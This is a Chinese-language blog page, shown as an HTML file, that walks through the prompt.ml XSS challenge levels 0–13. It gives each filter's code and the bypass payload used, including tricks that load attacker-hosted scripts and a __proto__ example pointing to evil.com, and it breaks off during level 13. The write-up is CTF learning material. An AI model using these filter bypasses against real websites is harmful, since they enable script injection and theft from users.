@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          xss练习记录 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/08/xss练习记录/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#练习记录" title="练习记录">练习记录</a>
+                        
+                          <a class="tag" href="/tags/#xss" title="xss">xss</a>
+                        
+                    </div>
+                    <h1>xss练习记录</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-08-19
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于各种原因吧，之前也没好好学过xss，就知道简单的闭合弹个窗什么的，趁暑假有时候，系统的学习一下xss。毕竟xss也是web安全的一个重头戏。而且看完一叶飘零师傅的文章，感觉xss比我之前想象的要强的多，也可以达到很强的破坏力。</p>
+<p>就先和刷sqllibs一样吧，做一些题目练手。</p>
+<h1 id="prompt-ml"><a href="#prompt-ml" class="headerlink" title="prompt.ml"></a>prompt.ml</h1><h2 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h2><p>比较简单了，没做什么过滤和防护，闭合双引号就能逃逸出来了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/1.png" alt></p>
+<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>做了一些过滤，不允许输入<code>&lt;xxx&gt;</code>、<code>&lt;/xxx&gt;</code>形式的标签</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后我利用了下浏览器的容错性，增添了一个<code>&lt;img src=x onerror=&quot;alert(/xss/)&quot;</code>的未闭合标签，也有可能是后面的<code>&lt;/article&gt;</code>中的<code>&gt;</code>对其进行了闭合，总之达到了一个xss的效果</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/2.png" alt></p>
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>果然很菜了，到第三道题就卡住了。过滤了<code>=</code>、<code>(</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一开始想利用<code>src</code>或者一些html编码发现貌似不行，于是无奈的看了下writeup。payload为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>于是有点好奇，为什么自己的实体编码不行，而它的又可以，而且把<code>&lt;svg&gt;</code>标签替换成别的又无法执行</p>
+<p>找了个篇很详细的文章<a href="http://pupiles.com/xss.html" target="_blank" rel="noopener">http://pupiles.com/xss.html</a> 我就不班门弄斧了。</p>
+<p>由于<code>&lt;svg&gt;</code>属于一种外部标签，对内部实体支持xml解析，于是就将html编码给解码成原来的样子了。从而产生xss</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/3.png" alt></p>
+<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>好吧，还是无奈的看了writeup，算是一个小trick把，html5中可以利用<code>--!&gt;</code>来闭合标签</p>
+<p>payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/5.png" alt></p>
+<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>好吧还是不会</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>题目中利用正则匹配，规定字符串起始只能为<code>http://prompt.ml/</code></p>
+<p>这里的一个小trick就是，url的另外一种形式<code>http://username:password@host/</code></p>
+<p>利用这个方式就可以将前面的<code>prompt.ml</code>转换成用户名的格式，<code>/</code>利用<code>%2f</code>解码绕过从而加载自己网站上的js</p>
+<p>payload:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>prompt.ml%<span class="number">2</span>f@blog.kingkk.com<span class="regexp">/kingkktest/</span><span class="number">1</span>.js</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/6.png" alt></p>
+<p>有个问题，就是edge和chrome似乎已经不支持这种<code>http://username:password@host/</code>格式的url</p>
+<p>请求会被阻塞掉</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/7.png" alt></p>
+<p>目前就只有在火狐浏览器上能成功，算是一个小trick吧</p>
+<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了<code>onxxx</code>以及<code>focus</code>之类的事件，也将<code>&gt;</code>过滤，导致无法闭合标签</p>
+<p>这里有两个小点</p>
+<ul>
+<li>浏览器默认解析第一个type属性</li>
+<li>浏览的兼容性导致允许一些换行符的存在</li>
+</ul>
+<p>这样，我们就可以将这个<code>input</code>标签的属性变成<code>image</code>，然后利用</p>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error</span><br><span class="line">=<span class="string">"prompt(1)</span></span><br></pre></td></tr></table></figure>
+<p>进行绕过，js中正则的<code>g</code>模式匹配空白符，但是不匹配换行符</p>
+<p>于是payload为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">" type="image"  src=1 onerror </span><br><span class="line">="prompt(1)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/8.png" alt></p>
+<p>==、原来prompt(1)函数是用来通关用的，前面一直用的<code>alert(/xss/)</code></p>
+<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>emmm这题琢磨了蛮久的，一开始是由于代码的原因</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'input'</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">    // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">        document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">    else                                                  \n\</span></span><br><span class="line"><span class="string">        document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                 \n\</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输入demo的url之后会生成一段这样的html文本</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://httpbin.org/post"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"Matt"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>       </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>                                                  </span><br><span class="line"><span class="actionscript">    <span class="comment">// forbid javascript: or vbscript: and data: stuff    </span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (!<span class="regexp">/script:|data:/i</span>.test(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)) </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();                       </span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span>                                                  </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">"Action forbidden."</span>)               </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>主要的问题实在生成的html中，相当于我们可以控制html的form的<code>action</code>、input的<code>name</code>以及<code>value</code></p>
+<p>首先假如在action中嵌入<code>javascript:alert(/xss/)</code>然后进行提交的时候，是会产生弹窗的</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/9.png" alt></p>
+<p>但是当我们这里将action的值设为<code>javascript:alert(/xss/)</code>时，会被forbidden掉</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="regexp">/script:|data:/i</span>.test(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)) </span><br><span class="line">    <span class="comment">// alert(/xx/);</span></span><br><span class="line">    <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();                       </span><br><span class="line"><span class="keyword">else</span>                                                  </span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">"Action forbidden."</span>);</span><br></pre></td></tr></table></figure>
+<p>这里还有一个trick就是<code>form.action</code>是会优先匹配<code>name=action</code>的节点，匹配不到时，然后再去寻找<code>action</code>属性的值</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/10.png" alt></p>
+<p>删除这个<code>name=action</code>的节点时，就能匹配到form的<code>action</code>值了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/11.png" alt></p>
+<p>这样，这题的答案也就差不多出来了</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">javascript:</span>prompt(<span class="number">1</span>)<span class="meta">#&#123;<span class="string">"action"</span>:<span class="string">"Matt"</span>&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/12.png" alt></p>
+<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>主要是利用js的注释，注释掉多余的html字符串，这个在括号里面的注释我是真的没想到。</p>
+<p>但也比较容易想通，就直接上payload好了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="comment">/*#*/</span>prompt(<span class="number">1</span><span class="comment">/*);#"*/</span>);<span class="comment">/*#*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/13.png" alt></p>
+<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>比较头疼的一题，搜了writeup，说是可以利用<code>\u2028</code>、<code>\u2029</code>来替代换行符</p>
+<ul>
+<li>是U+2028，是Unicode中的行分隔符。</li>
+<li>是U+2029，是Unicode中的段落分隔符。</li>
+</ul>
+<p>由于根本手打不出这两个字，所以我选择了在本地上测试一下。发现了一些奇怪的东西</p>
+<p>代码是这样的</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>                                    </span><br><span class="line">	</span><br><span class="line"><span class="actionscript">	<span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">		input = input.replace(<span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span>);</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">return</span> input;</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> s = <span class="string">'\u2028alert(/xss/);\u2029--&gt;'</span>;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> scr = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript">	scr.innerText=<span class="string">'// console.log("'</span>+s+<span class="string">'");'</span>;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.body.appendChild(scr);</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里确实可以利用<code>\u2028</code>或者<code>\u2029</code>当作换行符</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/14.png" alt></p>
+<p>但是当我为变量<code>s</code>加上<code>escape</code>函数的时候，就不能弹窗了，虽然显示的格式依旧一样</p>
+<p>应该是<code>\n\r</code>替换了其中的一部分东西吧，</p>
+<p>总之，两个trick，</p>
+<ul>
+<li><code>\u2028</code> <code>\u2029</code>可以当作换行符使用</li>
+<li><code>--&gt;</code>在js中可以当作注释符(单行注释)</li>
+</ul>
+<p>这题就暂且到这</p>
+<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>一个比较关键的点<code>toUpperCase()</code>，它会将字符串转成大写的，作为防御的手段之一</p>
+<p>然而问题也就出在这里</p>
+<blockquote>
+<p>The special part here is the transformation behavior. Not all Unicode characters have matching representations when casted to capitals - so browsers often tend to simply take a look-alike, best-fit mapping ASCII character instead. There’s a fairly large range of characters with this behavior and all browsers do it a bit differently.</p>
+</blockquote>
+<p>并非所有的字符串都有大写，有时候浏览器会将他们转换成相似的形式，而且每个浏览器行为不同</p>
+<p>例如chrome中会将<code>ſ</code>大写转化后变成<code>S</code>从而绕过正则，产生<code>SCRIPT</code>标签</p>
+<p>于是就可以构造<code>&lt;ſcript src=//kingkk.com/2.js&gt;&lt;/ſcript&gt;</code>，在chorme中会被转换成</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">//KINGKK.COM/2.JS</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>http和域名是大小写不敏感的，linux是大小写敏感的，我们只要在自己的服务器下放置<code>2.JS</code>文件即可</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/15.png" alt></p>
+<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>感觉比较简单了，进行了两次过滤，只要在prompt中插入一个单引号就可以了</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pro'mpt(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/16.png" alt></p>
+<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>过滤了很多字符串，导致暂时无法改变语句。</p>
+<p>看了writeup之后是说用<code>in</code>运算符，则会执行前面的语句</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/17.png" alt></p>
+<p>可以看到虽然报了错，但是还是执行了<code>alert</code>语句，利用这个方法就可以构造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"(prompt(1))in"</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/18.png" alt></p>
+<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>本来一开始想用<code>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 47, 120, 115, 115, 47, 41))</code></p>
+<p>后来发现url编码之后<code>,</code>不能使用了，于此同时，很多<code>=</code>,<code>:</code>之类的也不能用了</p>
+<p>看了解法之后是用<code>parseInt</code>他能得到一个字符串的十进制表示，利用<code>toString</code>即可还原成字符</p>
+<blockquote>
+<p>parseInt() 函数可解析一个字符串，并返回一个整数。</p>
+</blockquote>
+<p>得到<code>parseInt(&quot;prompt&quot;,36)</code>转换后的数字是<code>1558153217</code></p>
+<p>于是最终的payload就是</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">eval</span><span class="params">(<span class="number">1558153217</span>.toString(<span class="number">36</span>)</span><span class="params">(<span class="number">1</span>)</span></span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/xss练习记录/19.png" alt></p>
+<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>好吧，我也不知道是我看不懂还是不想看，总之看了一会逻辑不是很明白，就想着翻writeup了，就当学习一下trick了</p>
+<p>第一个trick就是当实例中没有该属性的时候，js会去类的<code>__proto__</code>中寻找该值，并返回</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in"> config </span>= &#123; <span class="string">"source"</span>:<span class="string">"http:www.kingkk.com"</span>,<span class="string">"__proto__"</span>:&#123;<span class="string">"source"</span>:<span class="string">"http://evil.com"</span>&#125; &#125;</span><br><span class="line">&lt; &#123;source: <span class="string">"http:www.kingkk.com"</span>&#125;</span><br><span class="line"></span><br><span class="line">&gt; config.source</span><br><span class="line">&lt; <span class="string">"http:www.kingkk.com"</span></span><br><span class="line"></span><br><span class="line">&gt; delete config.source</span><br><span class="line">&lt; <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">&gt; config.source</span><br><span class="line">&lt;<span class="string">"http://evil.com"</span></span><br></pre></td></tr></table></figure>
+<p>还有一个trick是正则匹配的trick，关于$`的</p>
